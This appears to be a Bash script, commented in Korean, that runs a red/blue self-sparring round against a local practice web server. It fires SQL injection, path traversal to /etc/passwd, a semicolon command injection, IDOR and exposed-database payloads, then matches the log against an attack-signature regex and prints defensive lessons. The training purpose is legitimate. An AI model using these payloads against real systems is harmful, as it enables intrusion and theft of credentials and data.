#!/bin/bash
# ATANOR 도장 — red/blue 자기대련 1회. 표적은 127.0.0.1:8099(자기 소유 허수아비).
# red: 다섯 유형 공격 시도 → blue: 이번 라운드 로그에서 공격 신호 탐지 → 점수.
set -u
T="http://127.0.0.1:8099"; D="/root/dojo"; LOG="$D/access.log"
touch "$LOG"
before=$(wc -l < "$LOG" 2>/dev/null || echo 0)
hit=0; total=5; exploited=""

echo "=== RED (공격) ==="
r=$(curl -s -m5 -G "$T/login" --data-urlencode "user=admin'--" --data-urlencode "pass=x")
if echo "$r" | grep -q "플래그"; then echo "[O] SQLi 로그인우회 — $(echo "$r"|grep -o '플래그[^<]*'|head -1)"; hit=$((hit+1)); exploited="$exploited SQLi"; else echo "[X] SQLi"; fi

r=$(curl -s -m5 -G "$T/download" --data-urlencode "file=../../../../etc/passwd")
if echo "$r" | grep -q "root:"; then echo "[O] 경로우회 — /etc/passwd 읽음"; hit=$((hit+1)); exploited="$exploited 경로우회"; else echo "[X] 경로우회"; fi

M="PWN_$RANDOM"
r=$(curl -s -m5 -G "$T/ping" --data-urlencode "host=127.0.0.1; echo $M")
if echo "$r" | grep -q "$M"; then echo "[O] 명령주입 — 임의 명령 실행($M)"; hit=$((hit+1)); exploited="$exploited 명령주입"; else echo "[X] 명령주입"; fi

r=$(curl -s -m5 -G "$T/profile" --data-urlencode "id=2")
if echo "$r" | grep -q "플래그"; then echo "[O] IDOR — 남의 기밀 열람"; hit=$((hit+1)); exploited="$exploited IDOR"; else echo "[X] IDOR"; fi

r=$(curl -s -m5 "$T/backup.db" | head -c 16 | tr -d '\0')
if echo "$r" | grep -q "SQLite format"; then echo "[O] 노출파일 — backup.db 유출"; hit=$((hit+1)); exploited="$exploited 노출DB"; else echo "[X] 노출파일"; fi

echo
echo "=== BLUE (탐지) ==="
after=$(wc -l < "$LOG"); new=$(sed -n "$((before+1)),${after}p" "$LOG")
sigs='(%27|'"'"'|\.\./|%2e%2e|;|%3B|union|select|--|/backup.db|etc/passwd|echo )'
flag=$(echo "$new" | grep -aiE "$sigs")
fc=$(printf '%s\n' "$flag" | grep -c .)
echo "이번 라운드 요청 $(printf '%s\n' "$new"|grep -c .)건 중 공격 신호 $fc건 탐지"
printf '%s\n' "$flag" | grep -oE 'GET /[^ ?]+' | sort | uniq -c | sort -rn | head -6

echo
echo "=== 점수 ==="
echo "뚫림 $hit/$total  |  뚫린 유형:${exploited:- 없음}  |  blue 탐지 $fc건"
# 성장용 교훈 한 줄(도구가 기억에 저장)
echo "LESSON: 이번 대련 $hit/$total 뚫림(${exploited:- 없음}). blue가 공격 신호 $fc건 포착 — 따옴표·../·세미콜론·union·/backup.db 패턴이 공격 지표. 방어: 입력 검증·파라미터화 쿼리·경로 화이트리스트·셸 호출 금지·인증 확인·민감파일 비공개."
